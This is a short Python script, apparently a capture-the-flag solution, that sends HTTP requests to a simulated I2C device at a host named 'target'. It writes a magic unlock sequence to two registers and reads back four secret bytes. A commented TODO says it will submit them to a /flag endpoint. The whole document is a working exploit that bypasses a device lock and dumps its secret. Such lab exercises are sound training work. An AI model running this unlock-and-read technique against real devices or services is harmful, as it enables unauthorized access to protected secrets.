```python
import requests

BASE = "http://target:8108"
def wr(a,d): requests.post(f"{BASE}/i2c/write", json={"addr":a,"data":d})
def rd(a):   return requests.post(f"{BASE}/i2c/read",  json={"addr":a}).json()["data"]

wr(0xFE, 0xA5); wr(0xFF, 0x5A)          # unlock
bs = [rd(0x80 + i) for i in range(4)]   # read secret
secret = "".join(f"{b:02X}" for b in bs)
# TODO: POST /flag {"secret": secret}
```
